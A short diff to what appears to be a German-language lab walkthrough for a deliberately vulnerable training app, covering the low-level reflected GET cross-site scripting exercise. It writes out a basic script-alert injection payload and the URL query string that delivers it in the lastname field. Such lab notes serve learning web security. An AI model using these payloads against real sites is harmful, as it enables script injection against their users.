@@ -12,6 +12,9 @@ $
 
 ### (3) Cross-Site Scripting - Reflected (GET) (low)
 ```JS
+// Input 1: beliebig
+// Input 2:
 <script>alert("XSS")</script>
-// ?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit
+// Payload:
+?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit
 ```
